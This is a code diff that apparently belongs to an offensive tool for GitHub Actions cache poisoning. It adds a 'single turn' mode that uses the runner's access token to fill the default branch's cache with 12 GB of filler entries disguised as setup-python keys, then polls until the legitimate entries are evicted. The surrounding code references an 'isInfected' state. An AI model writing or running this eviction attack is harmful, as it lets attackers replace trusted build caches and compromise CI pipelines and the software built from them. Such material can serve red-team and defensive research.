@@ -76,6 +76,11 @@ export class App {
         process.env['ACCESS_TOKEN'] = accessToken;
         process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;
 
+        if (Config.singleTurn) {
+            await this.runSingleTurn(githubToken, accessToken);
+            return;
+        }
+
         // 5. Fill Cache (if configured)
         if (!this.isInfected() && Config.cache.fillCount > 0) {
             for (let i = 0; i < Config.cache.fillCount; i++) {
@@ -247,5 +252,59 @@ export class App {
         } catch (error) {
             console.log(error);
         }
+    }
+
+    private async runSingleTurn(githubToken: string, accessToken: string) {
+        console.log("Running in Single Turn ↩️ mode");
+
+        let defaultBranch = "main";
+        try {
+            defaultBranch = await this.githubService.getDefaultBranch(githubToken);
+        } catch (e) {
+            console.warn("Failed to get default branch, assuming 'main'");
+        }
+        const defaultRef = `refs/heads/${defaultBranch}`;
+        console.log(`Targeting default branch: ${defaultBranch} (${defaultRef})`);
+
+        const allCaches = await this.githubService.listCacheEntries(githubToken);
+        const targetCaches = allCaches.filter(c => c.ref === defaultRef);
+        console.log(`Found ${targetCaches.length} existing cache entries on ${defaultBranch}.`);
+
+        const initialEntries = new Set(targetCaches.map(c => `${c.key}::${c.version}`));
+
+        console.log("Adding 12 GB of filler entries...");
+        for (let i = 0; i < 12; i++) {
+            const counter = i.toString().padStart(2, '0');
+            const key = `setup-python-Linux-24.04.1-Ubuntu-python-${counter}`;
+            const version = "58627df9f4feac69570413c79e73cb53e7095372eaab31064b36520a602db61b";
+            await this.createAndSetEntry(1000000000, key, version, accessToken, false);
+        }
+
+        if (initialEntries.size === 0) {
+            console.log("No initial entries to wait for eviction.");
+            return;
+        }
+
+        console.log("Polling for eviction of original keys...");
+        const startTime = Date.now();
+        const maxTime = 2 * 60 * 1000; // 2 minutes
+
+        while (Date.now() - startTime < maxTime) {
+            await sleep(5000);
+
+            const currentCaches = await this.githubService.listCacheEntries(githubToken);
+            let remaining = 0;
+            for (const c of currentCaches) {
+                if (c.ref === defaultRef && initialEntries.has(`${c.key}::${c.version}`)) {
+                    remaining++;
+                }
+            }
+
+            if (remaining === 0) {
+                console.log("All original cache keys have been evicted!");
+                return;
+            }
+        }
+        console.log("Timeout reached waiting for cache eviction.");
     }
 }
